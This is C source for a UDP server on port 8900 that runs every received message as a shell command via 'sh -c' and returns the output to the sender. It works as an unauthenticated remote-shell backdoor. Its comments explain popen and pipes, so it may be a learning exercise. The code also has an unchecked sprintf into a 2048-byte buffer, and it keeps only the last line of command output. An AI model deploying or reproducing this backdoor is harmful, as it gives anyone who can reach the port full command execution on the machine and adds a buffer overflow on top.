    #include <stdlib.h>
    #include <stdio.h>
    // socket()
    #include <sys/socket.h>
    // struct sockaddr;struct sockaddr_in
    #include <arpa/inet.h>
    // memset
    #include <string.h>
    //close 
    #include <unistd.h>

    #define BUFSIZE 2048
    #define  PORT 8900

    void exec(const char * command, char * result)
    {
        FILE *fpRead;

        memset(result,0,BUFSIZE);
        fpRead = popen(command, "r");//创建一个子进程执行命令，将结果写入管道
        //匿名管道
        /*
        pipe;fork实现popen功能。execve
        */

        char buf[BUFSIZ] = {0};
        memset(buf,'\0',sizeof(buf));

        while(fgets(buf,BUFSIZ-1,fpRead)!=NULL)
        { 
            
            strcpy(result, buf);
        }
        if(fpRead!=NULL)
            pclose(fpRead);
    }
    int main()
    {
        int sockfd;
        struct sockaddr_in serv;
        struct sockaddr_in client;
        char buf[BUFSIZ];
        char send_buf[BUFSIZ];
        int number;
        int length;
        int opt;
        char command[BUFSIZE];

        char cmd[]="sh -c ";
        // create the socket
        sockfd=socket(AF_INET,SOCK_DGRAM,0);
        if (0>sockfd)
        {
            fprintf(stderr,"error in creating socket\n");
            exit(-1);
        }

        // set the address rebinding设为可重复绑定
        opt=1;
        if (setsockopt(sockfd,SOL_SOCKET,SO_REUSEADDR,&opt,sizeof(opt))!=0)
        {
            fprintf(stderr,"error in setting socket option\n");
            close(sockfd);
            exit(-1);
        }



        // set the value for the socket
        memset(buf,0,sizeof(buf));
        memset(send_buf,0,sizeof(send_buf));
        memset(&serv,0,sizeof(serv));
        serv.sin_family=AF_INET;
        serv.sin_port=htons(PORT);
        serv.sin_addr.s_addr=htonl(INADDR_ANY);

        // bind the socket
        if (bind(sockfd,(struct sockaddr*)&serv,sizeof(serv))!=0)
        {
            fprintf(stderr,"error in binding server address\n");
            exit(-1);
        }

        // communication
        while(1)
        {
            memset(send_buf,0,BUFSIZ);
            memset(buf,0,sizeof(buf));
            memset(command,0,sizeof(command));

            length=sizeof(client);
            number=recvfrom(sockfd,buf,sizeof(buf),0,(struct sockaddr*)&client,(socklen_t*)&length);
            if (0>number)
            {
                fprintf(stderr,"error in communication\n");
                close(sockfd);
                exit(-1);
            }

            fprintf(stderr,"recv message:%s\n",buf);

            sprintf(command,"%s%s",cmd,buf);
            exec(command,send_buf);//将接收字符串作为命令，执行结果写入buf
            
            fprintf(stderr,"send message\n:%s\n",send_buf);
            number=sendto(sockfd,send_buf,strlen(send_buf),0,(struct sockaddr*)&client,length); 
        }

        close(sockfd);

        


    }